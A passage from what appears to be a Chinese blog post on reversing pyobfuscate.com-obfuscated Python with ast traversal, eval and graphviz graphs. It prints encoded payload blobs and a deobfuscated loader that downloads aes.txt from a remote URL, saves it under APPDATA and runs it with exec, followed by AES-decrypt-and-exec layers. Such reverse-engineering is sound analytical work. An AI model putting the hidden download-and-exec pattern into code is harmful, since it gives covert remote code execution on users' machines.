class="built_in">open</span>(<span class="string">&#x27;./obfuscated_code.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    code = f.read()</span><br><span class="line"></span><br><span class="line">tree = ast.parse(code)</span><br><span class="line">assignExtractor = AssignExtractor()</span><br><span class="line">assignExtractor.visit(tree)</span><br><span class="line">ass_nodes = assignExtractor.assign_nodes</span><br><span class="line"></span><br><span class="line">exprExtractor = ExprExtractor()</span><br><span class="line">exprExtractor.visit(tree)</span><br><span class="line">expr_nodes = exprExtractor.expr_nodes</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./assin_output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ass_nodes:</span><br><span class="line">        f1.write(ast.dump(i)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f1.write(ast.unparse(i)+<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./expr_output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> expr_nodes:</span><br><span class="line">        f2.write(ast.dump(i)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f2.write(ast.unparse(i)+<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/images/obfuscate/6.png"><br><img src="/images/obfuscate/7.png"></p>
<p>代码的结构就能很轻松地找出来，之后便可以通过在代码里插<code>print</code>的方法来确定我被混淆的代码最后哪里运行的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">____(<span class="string">&#x27;&#x27;</span>.join((<span class="built_in">chr</span>(<span class="built_in">int</span>(OO00O0OO00O0O0OO00 / <span class="number">2</span>)) <span class="keyword">for</span> OO00O0OO00O0O0OO00 <span class="keyword">in</span> [<span class="number">202</span>, <span class="number">240</span>, <span class="number">202</span>, <span class="number">198</span>] <span class="keyword">if</span> _____ != ______)))(<span class="string">f&quot;&quot;&quot;____(&quot;&quot;.join(chr(i) for i in [101,120,101,99]))(<span class="subst">&#123;____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(<span class="string">b&#x27;eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=&#x27;</span>)).decode(), <span class="string">&#x27;&#x27;</span>.join((<span class="built_in">chr</span>(<span class="built_in">int</span>(i / <span class="number">8</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">912</span>, <span class="number">888</span>, <span class="number">928</span>, <span class="number">392</span>, <span class="number">408</span>]))).encode()))&#125;</span>)&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>把这段代码单独拎出来，看看里面长啥样:</p>
<p>这里用<code>graphviz</code>库来做个可视化  <a target="_blank" rel="noopener" href="https://qiita.com/kaityo256/items/e83b369ba7518da0a519">Pythonの抽象構文木をGraphvizで可視化する</a></p>
<pre><code>pip install graphviz
</code></pre>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> graphviz <span class="keyword">import</span> Digraph</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>(<span class="params">node, nodes, pindex, g</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(<span class="built_in">type</span>(node).__name__)</span><br><span class="line">    index = <span class="built_in">len</span>(nodes)</span><br><span class="line">    nodes.append(index)</span><br><span class="line">    g.node(<span class="built_in">str</span>(index), name)</span><br><span class="line">    <span class="keyword">if</span> index != pindex:</span><br><span class="line">        g.edge(<span class="built_in">str</span>(index), <span class="built_in">str</span>(pindex))</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> ast.iter_child_nodes(node):</span><br><span class="line">        visit(n, nodes, index, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./obfuscated2_code.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    code = f.read()</span><br><span class="line"></span><br><span class="line">tree = ast.parse(code)</span><br><span class="line"></span><br><span class="line">graph = Digraph(<span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">visit(tree, [], <span class="number">0</span>, graph)</span><br><span class="line">graph.render(<span class="string">&quot;obfuscated2&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/obfuscate/8.png"></p>
<p>当这张图拉出来了之后，一目了然，把这个搜索改成广搜，来一层一层拨开</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random ,base64,codecs,zlib;pyobfuscate=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line">obfuscate = <span class="built_in">dict</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> <span class="built_in">map</span>,<span class="built_in">dict</span>:(<span class="built_in">map</span>,<span class="built_in">dict</span>),[<span class="string">&#x27;(https://pyobfuscate.com)*(decrypt)&#x27;</span>],[<span class="string">&#x27;&#x27;&#x27;Mg9q#UDn(oW~!Zy`F!j-yD|&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)]))</span><br><span class="line"></span><br><span class="line">_=<span class="keyword">lambda</span> OO00000OOO000</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">yB3k=<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ↓↓↓↓ 下面的这些代码是前面分析出来得到的最后执行的表达式</span></span><br><span class="line"><span class="string">code = &quot;&quot;&quot;</span></span><br><span class="line"><span class="string">_____(&quot;&quot;.join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f&#x27;</span>\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29(&#123;____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(<span class="string">b&quot;eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=&quot;</span>)).decode(),<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(i/<span class="number">8</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">912</span>, <span class="number">888</span>, <span class="number">928</span>, <span class="number">392</span>, <span class="number">408</span>])).encode()))&#125;)<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ↓↓↓↓ 使用广搜，一层一层分析</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def bfs_visit(root):</span></span><br><span class="line"><span class="string">    nodes = []</span></span><br><span class="line"><span class="string">    queue = deque([(root, None)])</span></span><br><span class="line"><span class="string">    while queue:</span></span><br><span class="line"><span class="string">        node, parent_index = queue.popleft()</span></span><br><span class="line"><span class="string">        index = len(nodes)</span></span><br><span class="line"><span class="string">        nodes.append(index)</span></span><br><span class="line"><span class="string">        if parent_index is not None:</span></span><br><span class="line"><span class="string">            nodes.append(index)</span></span><br><span class="line"><span class="string">        for child in ast.iter_child_nodes(node):</span></span><br><span class="line"><span class="string">            try :</span></span><br><span class="line"><span class="string">                print(&quot;[+]&quot;,eval(ast.unparse(child))) # &lt;--- 这里获取值</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">            except:</span></span><br><span class="line"><span class="string">                print(&quot;[-]&quot;,ast.unparse(child))</span></span><br><span class="line"><span class="string">                pass</span></span><br><span class="line"><span class="string">            queue.append((child, index))</span></span><br><span class="line"><span class="string">        print(&quot;---------------------------------分割线------------------------------&quot;)</span></span><br><span class="line"><span class="string">    return nodes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tree = ast.parse(code)</span></span><br><span class="line"><span class="string">bfs_visit(tree)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p><img src="/images/obfuscate/9.png"></p>
<p>这里想到用<code>eval</code>直接打印出来变量，直接看</p>
<p><img src="/images/obfuscate/10.png"></p>
<p>我在整理笔记到这里的时候，突发奇想，既然我都能把整个逻辑弄成图，为啥不直接把对应的值也弄上去，到时候分析起来就更方便了，也就不需要到处print看值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bfs_visit</span>(<span class="params">root</span>):</span><br><span class="line">    queue = Queue()</span><br><span class="line">    queue.put((root, <span class="number">0</span>))</span><br><span class="line">    nodes = []</span><br><span class="line">    g = Digraph(<span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</span><br><span class="line">        node, pindex = queue.get()</span><br><span class="line">        name = <span class="built_in">str</span>(<span class="built_in">type</span>(node).__name__)</span><br><span class="line">        index = <span class="built_in">len</span>(nodes)</span><br><span class="line">        nodes.append(index)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = <span class="built_in">eval</span>(ast.unparse(node))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            value = ast.unparse(node)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            g.node(<span class="built_in">str</span>(index), name+<span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">type</span>(value)) + <span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(value))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            g.node(<span class="built_in">str</span>(index), name+<span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">type</span>(value)))</span><br><span class="line">        <span class="keyword">if</span> index != pindex:</span><br><span class="line">            g.edge(<span class="built_in">str</span>(index), <span class="built_in">str</span>(pindex))</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> ast.iter_child_nodes(node):</span><br><span class="line">            queue.put((n, index))</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tree = ast.parse(code)</span><br><span class="line">tree = ast.parse(code)</span><br><span class="line">graph = bfs_visit(tree)</span><br><span class="line">graph.render(<span class="string">&quot;obfuscated2_plus&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这不比命令行里一条条对数据方便多了<br><img src="/images/obfuscate/11.png"></p>
<p>仔细看看，左边<code>NoneType</code>上方是<code>exec</code>，右边是个<code>JoinedStr</code>，结合这里面一堆<code>call</code>，不难看出最后执行的是<code>exec(JoinedStr)</code></p>
<p><img src="/images/obfuscate/12.png"></p>
<p>但是右边又套娃套了好几层</p>
<p><img src="/images/obfuscate/14.png"></p>
<p>用随机数特定的种子来生成特定的文字，玩的挺脏的，得到反混淆后的代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;pip install requests \\npress enter to Exit&quot;</span>)</span><br><span class="line">    <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).exit()</span><br><span class="line"></span><br><span class="line">fl=<span class="built_in">__import__</span>(<span class="string">&quot;requests&quot;</span>).get(<span class="string">&quot;https://pyobfuscate.com/public/pyd2/aes.txt&quot;</span>).text</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> os.path <span class="keyword">import</span> exists <span class="keyword">as</span> ex</span><br><span class="line">    <span class="keyword">from</span> os <span class="keyword">import</span> getenv <span class="keyword">as</span> ge,remove</span><br><span class="line">    loc=ge(<span class="string">&#x27;APPDATA&#x27;</span>);p1=loc+<span class="string">&quot;\\aes.txt&quot;</span>;p2=loc+<span class="string">&quot;\\rsa.txt&quot;</span>;p3=loc+<span class="string">&quot;\\aes2.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ex(p1)==<span class="literal">True</span>:</span><br><span class="line">        remove(p1)</span><br><span class="line">    <span class="keyword">elif</span> ex(p2)==<span class="literal">True</span>:</span><br><span class="line">        remove(p2)</span><br><span class="line">    <span class="keyword">if</span> ex(p3)==<span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">str</span>(p3),<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> e:e.write(<span class="built_in">str</span>(fl))</span><br><span class="line">    <span class="built_in">exec</span>(<span class="built_in">open</span>(p2).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">exec</span>(fl)</span><br></pre></td></tr></table></figure>

<p>简单一看，又想骂娘<br><code>https://pyobfuscate.com/public/pyd2/aes.txt</code></p>
<p>代码还是那一些，同样的思路继续干，这里把最后一个<code>Expr</code>拿出来吧，原代码太长了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_______.___________________(_______.________________(_______.________________________())[:______._ * ______._] + _______.________________(_______._______________())[______.___] + _______.________________(_______._________________([]))[______.___] + _______.________________(_______.________________________())[______._ ** ______._ + ______.__])(____, _______._______________________(), _______.________________(_______.________________________())[______._ ** ______._ + ______.__] + _______.________________(_______.______________())[______._] + _______.________________(_______.________________________())[______._ ** ______._ + ______.__] + _______.________________(_______.________________________())[______.___])</span><br></pre></td></tr></table></figure>
<p>左边exec<br><img src="/images/obfuscate/17.png"><br>右边compile<br><img src="/images/obfuscate/18.png"></p>
<p>看到这里,<code>compile</code>上加载了一个前面代码的变量，这里再改进一下代码，同时更换输出格式为<code>svg</code>，避免因为图片过大报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">from</span> graphviz <span class="keyword">import</span> Digraph</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> graphviz <span class="keyword">import</span> Digraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bfs_visit</span>(<span class="params">root</span>):</span><br><span class="line">    queue = Queue()</span><br><span class="line">    queue.put((root, <span class="number">0</span>))</span><br><span class="line">    nodes = []</span><br><span class="line">    g = Digraph(<span class="built_in">format</span>=<span class="string">&#x27;svg&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</span><br><span class="line">        node, pindex = queue.get()</span><br><span class="line">        name = <span class="built_in">str</span>(<span class="built_in">type</span>(node).__name__)</span><br><span class="line">        index = <span class="built_in">len</span>(nodes)</span><br><span class="line">        nodes.append(index)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = <span class="built_in">eval</span>(ast.unparse(node))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            value = ast.unparse(node)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name == <span class="string">&#x27;Name&#x27;</span>:</span><br><span class="line">                g.node(<span class="built_in">str</span>(index), name+<span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">type</span>(value)) + <span class="string">&#x27;  id:&#x27;</span>+<span class="built_in">str</span>(node.<span class="built_in">id</span>)) <span class="comment"># 添加加载变量的id</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                g.node(<span class="built_in">str</span>(index), name+<span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">type</span>(value)) + <span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(value))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            g.node(<span class="built_in">str</span>(index), name+<span class="string">&#x27;  &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">type</span>(value)))</span><br><span class="line">        <span class="keyword">if</span> index != pindex:</span><br><span class="line">            g.edge(<span class="built_in">str</span>(index), <span class="built_in">str</span>(pindex))</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> ast.iter_child_nodes(node):</span><br><span class="line">            queue.put((n, index))</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tree = ast.parse(code)</span><br><span class="line">tree = ast.parse(code)</span><br><span class="line">graph = bfs_visit(tree)</span><br><span class="line">graph.render(<span class="string">&quot;final_express&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里放张svg图，建议新建窗口打开<br><img src="/images/obfuscate/20.svg"></p>
<p>找到了，因为变量类型是<code>ast.Moudle</code>，就用<code>ast.unpares</code>还原代码<br><img src="/images/obfuscate/22.png"></p>
<pre><code>print(ast.unparse(____))
</code></pre>
<p><img src="/images/obfuscate/21.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> random, base64, zlib, sys, string</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line">    <span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line">    <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">    <span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line">    <span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">AESEncryption</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">            self.key = key</span><br><span class="line"></span><br><span class="line"><span class="meta">        @classmethod</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">from_nbits</span>(<span class="params">cls, nbits: <span class="built_in">int</span>=<span class="number">256</span></span>):</span><br><span class="line">            cls.iv = iv</span><br><span class="line">            cls.key = keys</span><br><span class="line">            cls.mode = mode</span><br><span class="line">            <span class="keyword">return</span> cls(keys)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">            cipher = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">            ciphered_data = cipher.encrypt(pad(message, AES.block_size))</span><br><span class="line">            <span class="keyword">return</span> ciphered_data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">            cipher = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">            decrypted_data = unpad(cipher.decrypt(message), AES.block_size)</span><br><span class="line">            <span class="keyword">return</span> decrypted_data</span><br><span class="line">    MESSAGE_LONG = get_random_bytes(<span class="number">100100</span>)</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_uppercase + string.digits, k=<span class="number">16</span>))</span><br><span class="line">    bb = _encrypt[<span class="number">125</span>:]</span><br><span class="line">    keys = base64.b85decode(bb)</span><br><span class="line">    iv = _pubkey[<span class="number">100</span>:]</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    aes = AESEncryption.from_nbits(<span class="number">256</span>)</span><br><span class="line">    encrypted_msg = aes.encrypt(_<span class="keyword">lambda</span>)</span><br><span class="line">    passkey2 = <span class="string">&#x27;Obfuscated by https://pyobfuscate.com&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _key == passkey2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Decryption Key Do not Match or Missing AES Salt 256&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="built_in">exec</span>(zlib.decompress(aes.decrypt(_<span class="keyword">lambda</span>)).decode())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">import</span> base64, os, hashlib, random</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">        encrypted_data = base64.b85decode(encrypted_data)</span><br><span class="line">        salt = encrypted_data[:<span class="number">8</span>]</span><br><span class="line">        (key, iv) = derive_key_and_iv(key, salt)</span><br><span class="line">        cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line">        data = cipher.decrypt(encrypted_data[<span class="number">8</span>:])</span><br><span class="line">        <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">derive_key_and_iv</span>(<span class="params">password, salt</span>):</span><br><span class="line">        dk = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, password.encode(), salt, <span class="number">100000</span>)</span><br><span class="line">        key = dk[:<span class="number">16</span>]</span><br><span class="line">        iv = dk[<span class="number">16</span>:]</span><br><span class="line">        <span class="keyword">return</span> (key, iv)</span><br><span class="line">    <span class="built_in">exec</span>(aes_decrypt(<span class="built_in">list</span>(obfuscate.values())[<span class="number">0</span>], <span class="built_in">list</span>(obfuscate.keys())[<span class="number">0</span>][<span class="number">1</span>:-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p>仔细审审的话，发现上面的try必定出错，不需要管，最后得到<code>解密</code>代码是:</p>
